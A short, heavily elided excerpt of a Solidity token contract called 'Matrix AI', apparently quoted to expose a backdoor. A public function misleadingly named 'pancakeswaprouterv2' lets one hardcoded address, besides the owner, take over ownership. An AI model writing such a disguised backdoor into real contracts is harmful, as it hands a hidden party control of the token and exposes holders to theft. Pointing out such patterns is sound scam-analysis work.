...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x7dB7BCd66F1dCd8962cBe64F86d07D31D64F8EA6));
...
contract MatrixAI is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Matrix AI";
